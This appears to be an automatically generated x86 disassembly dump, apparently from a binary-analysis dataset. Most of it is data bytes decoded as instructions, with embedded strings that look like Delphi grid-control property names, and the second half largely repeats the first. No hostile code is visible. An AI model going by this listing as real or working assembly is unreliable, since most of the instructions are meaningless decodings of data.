jae r-xdata
jb r-xdata
je r-xdata
add al [ eax ]
add al ah
sub [ esi ] al
pushfd
fwait
inc ecx
add ah ah
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x462b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x27ffb9d5 ] ch
push ds
add [ ecx ] cl
inc esi
imul edi [ eax + 0x65 ] 0x776f5264
jae r-xdata
inc ebx
outsd
insb
stosb [ edi ]
inc ecx
add [ eax + 0x2 ] al
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
mov es [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
add [ eax ] al
add [ eax ] al
add [ 0x10ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add bh bh
movsb [ edi ] [ esi ]
jb r-xdata
add [ eax ] al
add [ eax + eax ] bl
dec ebp
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
add [ eax + 0x1 ] al
scasd [ edi ]
inc ecx
add [ eax ] ch
add [ eax ] cl
push edx
outsd
or [ esi + 0x69 ] eax
js r-xdata
adc [ eax ] al
cmp [ edx ] al
add bh bh
mov eax 0x100468e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
adc [ eax ] al
sbb al 0x2
add bh bh
and al 0x8d
add [ esi + eax * 2 ] al
inc ebx
outsd
insb
jae r-xdata
outsd
jb r-xdata
[ ebx ]
add [ edx ] cl
inc esi
imul edi [ eax + 0x65 ] 0x6c6f4364
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ ecx ] bl
add [ eax ] cl
inc esp
ja r-xdata
jmp [ eax + edx * 4 ]
outsd
outsb
je r-xdata
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
inc esi
outsd
jne r-xdata
add [ eax ] al
add [ ecx ] ah
and [ eax ] al
or eax 0x64697247
dec esp
imul ebp [ esi + 0x65 ] 0x74646957
push r-xdata
dec eax
add al [ eax ]
adc [ eax ] al
inc esp
add al [ eax ]
call [ eax ]
nop
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ esi + 0x69 ] eax
js r-xdata
ja r-xdata
adc [ eax ] al
dec esp
add al [ eax ]
push [ eax + edx * 4 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x5 ] al
sbb eax 0x6f520800
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec ebp
outsb
int3
dec edi
jo r-xdata
inc esi
add [ eax + 0x2 ] cl
add bh bh
and al 0x90
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
je r-xdata
inc ebx
imul ebp [ edi + 0x6e ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ edi ] al
push edx
outsd
ja r-xdata
adc [ eax ] al
cmp al 0x2
add bh bh
push eax
pop [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsd
xor eax [ eax + eax + 0x10 ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
outsb
je r-xdata
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add bh bh
inc eax
loop r-xdata
xor [ edi + 0x680041 ] ch
add [ eax ] al
[ eax + 0x43 ]
jo r-xdata
add [ eax + 0x1 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax + 0x3 ] al
sub [ eax ] al
or dl [ ebx + 0x63 ]
jb r-xdata
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + eax ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax ]
jecxz r-xdata
inc ebx
add [ ebx + ecx * 2 ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
adc [ eax ] al
ror [ esi + eax * 2 ] 0x1
insb
insb
inc edx
popad
jb r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax + 0x560f002d ] al
imul esi [ ebx + 0x69 ] 0x52656c62
jb r-xdata
add [ eax ] al
push ds
inc ebx
add [ edx + eax ] dl
[ ecx + edx * 4 + 0x10046 ]
add [ eax ] al
add [ eax ] al
push cs
je r-xdata
insd
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560f002c ] al
imul esi [ ebx + 0x69 ] 0x43656c62
outsd
insb
add [ eax ] dl
inc eax
push eax
popad
jb r-xdata
adc [ eax ] al
0xc0ff0000 0x43e2
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
inc ebx
outsd
insb
jne r-xdata
outsd
jne r-xdata
adc [ eax ] al
push edi
loope r-xdata
inc esp
add [ ebx + ecx * 2 + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov es [ ebx ]
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax + 0x4f0a0032 ] al
cwde
xchg edi eax
inc ebx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
cwde
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d002f ] al
outsb
adc [ eax ] al
insb
loopne r-xdata
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
add [ edx + 0x43 ] ah
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
outsb
inc esp
jb r-xdata
add [ edx ] cl
dec edi
outsb
dec ebp
outsd
jbe r-xdata
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
[ edx - 0x1d9bffbd ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090027 ] al
inc ebx
outsd
jne r-xdata
cmp al 0x10
inc eax
add al dl
mov [ esi ] es
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
orps xmm5 [ ecx + 0x73 ]
imul esp [ edx + 0x6c ] 0x6c6f4365
add al 0x4b
imul ebp [ esi + 0x74 ] r-xdata
add [ ecx - 0x63010000 ] bl
loop r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
inc eax
add al dh
mov [ esi ] es
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x69560f00
jae r-xdata
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
and al 0x0
adc [ eax ] al
test eax 0xd8ff0001
dec edx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
jo r-xdata
jb r-xdata
adc [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb al 0x2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
xlat
inc esp
add [ eax + eax ] bh
inc [ ecx ]
inc ebx
inc edi
je r-xdata
mov [ bx + di ] dl
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x93
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
dec edi
jbe r-xdata
mov al [ 0xffffffffa0004624 ]
push eax
add [ eax + 0x4f0e0030 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
outsd
ja r-xdata
bound ebp [ ebp + 0x52 ]
add al [ eax ]
jmp [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax + 0x4f09003b ] al
outsb
imul esi [ fs : ebp + ecx * 2 + 0x61 ] 0x27cc6b73
inc esi
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
inc edi
je r-xdata
dec edi
jb r-xdata
insb
inc ebx
insb
xchg ecx eax
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9453156
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] eax
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
or cl [ edi + 0x6e ]
dec ebx
jns r-xdata
imul esi [ fs : esp + edx * 2 + 0x65 ] 0x914c7478
inc ebx
add al bl
add [ eax ] eax
xor al 0x0
or cl [ edi + 0x6e ]
adc [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
inc esp
jb r-xdata
and al 0x46
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
loopne r-xdata
jo r-xdata
nop
inc ebx
add al bl
cwde
xchg ecx eax
inc ebx
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
jb r-xdata
add [ eax + 0x4f070037 ] al
add [ eax ] al
ja r-xdata
dec ebx
jns r-xdata
cmp eax [ eax ]
or [ edi + 0x6e ] ecx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
xchg edi eax
inc ebx
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100041 ] al
outsb
dec ebp
outsd
jne r-xdata
nop
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
dec ebp
outsd
jne r-xdata
jne r-xdata
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
xchg ebx eax
insb
insb
add al 0x93
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
outsb
inc ebp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ edi ] al
dec edi
daa
inc esi
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0039 ] al
outsb
outsb
push edx
outsd
ja r-xdata
push ebp
jo r-xdata
dec edi
push edi
push 0x446c6565
outsd
ja r-xdata
insb
inc esp
outsd
ja r-xdata
je r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ eax + 0x4f0e0042 ] al
outsb
dec ebp
outsd
jo r-xdata
add [ eax ] al
jmp eax
dec esp
xchg ecx eax
inc ebx
add al ch
add [ eax ] eax
imul esi [ esp + edx * 2 + 0x65 ] 0x94c47478
outsd
jbe r-xdata
inc esp
insb
inc edi
add [ ebx ] cl
dec edi
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
imul esi [ fs : esp + edx * 2 + 0x65 ] 0x94c47478
arpl [ gs : ebx + eax * 2 + 0x65 ] si
insb
insb
sub al 0x28
inc esi
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
push ebx
je r-xdata
and al 0x97
inc ebx
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
call 0xffffffffd84676bd
sub [ esi ] al
mov eax 0xb8ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
inc ebx
add al ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4635 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004635 ] al
add [ eax ] al
jb r-xdata
outsb
push ebx
je r-xdata
add [ eax ] al
add [ esi ] 0xb
dec edi
outsb
push ebx
insb
cmp [ fs : esi + eax * 2 ] ah
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0044 ] al
add ah ah
xor al 0x40
xor al 0x40
jb r-xdata
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
imul ebp [ esi + 0x67 ] 0x64697247
push ebx
je r-xdata
add al bh
sbb [ ecx ] eax
fdiv [ eax + eax * 2 ]
add [ eax ] al
add [ eax ] al
xor [ 0x180046 ] 0x0
outsb
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ebp + eax * 2 + 0x41 ] cl
add ah ah
test al 0x46
add [ ebx + ebp * 4 + 0x47d00046 ] ch
inc ecx
add ah ch
stosd [ edi ]
inc esi
add [ eax ] dl
lodsb [ esi ]
inc esi
add [ eax ] dh
dec eax
inc ecx
add [ eax - 0x3fffb954 ] dl
lodsb [ esi ]
inc esi
add [ eax + 0x4e ] ch
inc ecx
add al dh
dec esi
inc ecx
add al dh
lodsb [ esi ]
inc esi
add [ eax ] bh
push eax
inc ecx
add [ edx + ebp * 4 ] bl
inc esi
add [ eax + 0x43 ] ch
inc ecx
add [ ebx + eax * 2 - 0x550fffbf ] cl
inc esi
add [ ebx + ebp * 4 + 0x46 ] ah
add al ch
inc esi
inc ecx
add ah bl
inc edi
inc ecx
add [ eax + 0x49 ] bl
inc ecx
add ah ah
dec ecx
inc ecx
add [ eax + 0x4400414a ] bh
lodsb [ esi ]
inc esi
add ah ch
dec edx
inc ecx
add [ ebx + ecx * 2 ] bl
inc ecx
add [ eax + 0x4b ] dh
inc ecx
add [ esp + ecx * 2 ] bl
inc ecx
add [ ebp + ecx * 2 + 0x4e0c0041 ] dh
inc ecx
add [ eax + 0x1200414e ] ah
push esp
push ebx
je r-xdata
inc eax
add [ edx + esi + 0x40 ] al
add [ ebx + eax * 2 ] dl
inc esp
jb r-xdata
inc esp
add [ ebx + 0x497c0044 ] al
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
xor al [ eax ]
inc esp
xor al [ eax ]
imul ebp [ esi + 0x67 ] 0x35989073
inc esi
add [ edi ] al
adc dl [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add al ch
xor al 0x40
add ah ch
xor al 0x40
inc eax
mov [ bx + di ] dl
inc ecx
add al dl
add al [ eax ]
call eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100048 ] al
outsb
push esp
outsd
jo r-xdata
jb r-xdata
add [ eax ] dh
dec edx
inc esi
add [ edi + ebp * 4 + 0x46 ] ah
add [ esp + ebx * 4 ] dh
inc esi
add al bh
inc esp
add ah bl
inc sp
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax + 0x4004655 ] dh
pushad
inc esi
add al ah
jl r-xdata
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add al dh
jl r-xdata
inc esp
lodsd [ esi ]
inc esi
add [ eax + 0x8004454 ] al
outsb
inc edi
jb r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x43
je r-xdata
inc esp
and al 0xc
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x4 ]
outsb
inc edi
jb r-xdata
cdq
inc esi
add [ edx + ebx * 4 ] bl
inc esi
add [ eax + eax ] al
stosb [ edi ]
[ edi - 0x56005101 ]
add al dh
sbb al [ eax + eax + 0x20 ]
sbb [ eax + eax - 0x60 ] eax
push ds
inc esp
add [ esi + ebx + 0x1d5c0044 ] ah
dec ebp
inc esi
add [ eax ] dh
inc eax
inc ecx
add [ edx + eax ] bh
push esp
inc esp
add [ eax ] cl
push ebx
je r-xdata
add al ah
xor al 0x40
inc eax
push 0x65676e61
lea eax [ eax ]
add [ 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
xor eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ esp + 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov [ ecx + 0x4 ] eax
cmp eax [ esp + 0xc ]
jge r-xdata
add al 0x8b
inc esp
and al 0x4
or al 0x36
inc esi
add [ ebx + ebp + r--data ] dh
add eax 0x64697247
jae r-xdata
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add ah bh
lodsb [ esi ]
inc esi
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
imul ebp [ esi + 0x67 ] 0x46350073
add al ah
sbb al [ ecx ]
add [ eax ] al
add eax 0x64697247
jae r-xdata
add esp 0x10
pop edi
pop esi
retn
mov [ ecx + 0xc ] eax
add [ eax - 0x742774ad ] dl

add [ ebx + 0x46360cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
aaa
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
inc esi
add [ esi ] cl
aaa
inc esi
add ah ch
add al [ eax ]
add [ edx + ebp + 0x46 ] dh
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
sub_462dde
pushfd
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
nop
stosb [ edi ]
inc ecx
add [ eax + 0x2 ] al
add bh bh
movsb [ edi ] [ esi ]
mov es [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffff1 ] al
sbb eax [ eax ]
or al [ esi + 0x69 ]
js r-xdata
push ds
add [ ecx ] cl
inc esi
imul edi [ eax + 0x65 ] 0x776f5264
jae r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax + 0x1 ] al
scasd [ edi ]
inc ecx
add [ eax ] ch
add [ eax ] cl
push edx
outsd
adc [ eax ] al
cmp [ edx ] al
add bh bh
mov eax 0x100468e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or [ esi + 0x69 ] eax
js r-xdata
jmp [ eax + edx * 4 ]
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
outsd
outsb
je r-xdata
inc esi
outsd
jne r-xdata
add [ esi + eax * 2 ] al
inc ebx
outsd
insb
jae r-xdata
add [ eax ] al
add [ ecx ] ah
and [ eax ] al
or eax 0x64697247
dec esp
imul ebp [ esi + 0x65 ] 0x74646957
push r-xdata
dec eax
add al [ eax ]
adc [ eax ] al
inc esp
add al [ eax ]
call [ eax ]
nop
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
dec edi
jo r-xdata
inc esi
add [ eax + 0x2 ] cl
add bh bh
and al 0x90
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
je r-xdata
or [ esi + 0x69 ] eax
js r-xdata
ja r-xdata
adc [ eax ] al
dec esp
add al [ eax ]
push [ eax + edx * 4 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x5 ] al
sbb eax 0x6f520800
inc ebx
imul ebp [ edi + 0x6e ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
cmp al 0x2
add bh bh
push eax
pop [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ edi ] al
push edx
outsd
ja r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
outsb
je r-xdata
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add bh bh
inc eax
loop r-xdata
xor [ edi + 0x680041 ] ch
add [ eax ] al
[ eax + 0x43 ]
jo r-xdata
add [ eax + 0x1 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax + 0x3 ] al
sub [ eax ] al
or dl [ ebx + 0x63 ]
jb r-xdata
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + eax ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax ]
jecxz r-xdata
inc ebx
add [ ebx + ecx * 2 ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
adc [ eax ] al
ror [ esi + eax * 2 ] 0x1
insb
insb
inc edx
popad
jb r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax + 0x560f002d ] al
imul esi [ ebx + 0x69 ] 0x52656c62
jb r-xdata
add [ eax ] al
push ds
inc ebx
add [ edx + eax ] dl
[ ecx + edx * 4 + 0x10046 ]
add [ eax ] al
add [ eax ] al
push cs
je r-xdata
insd
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560f002c ] al
imul esi [ ebx + 0x69 ] 0x43656c62
outsd
insb
add [ eax ] dl
inc eax
push eax
popad
jb r-xdata
adc [ eax ] al
0xc0ff0000 0x43e2
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
inc ebx
outsd
insb
jne r-xdata
outsd
jne r-xdata
adc [ eax ] al
push edi
loope r-xdata
inc esp
add [ ebx + ecx * 2 + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov es [ ebx ]
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax + 0x4f0a0032 ] al
cwde
xchg edi eax
inc ebx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
cwde
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d002f ] al
outsb
adc [ eax ] al
insb
loopne r-xdata
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
add [ edx + 0x43 ] ah
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
outsb
inc esp
jb r-xdata
add [ edx ] cl
dec edi
outsb
dec ebp
outsd
jbe r-xdata
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
[ edx - 0x1d9bffbd ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090027 ] al
inc ebx
outsd
jne r-xdata
cmp al 0x10
inc eax
add al dl
mov [ esi ] es
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
orps xmm5 [ ecx + 0x73 ]
imul esp [ edx + 0x6c ] 0x6c6f4365
add al 0x4b
imul ebp [ esi + 0x74 ] r-xdata
add [ ecx - 0x63010000 ] bl
loop r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
inc eax
add al dh
mov [ esi ] es
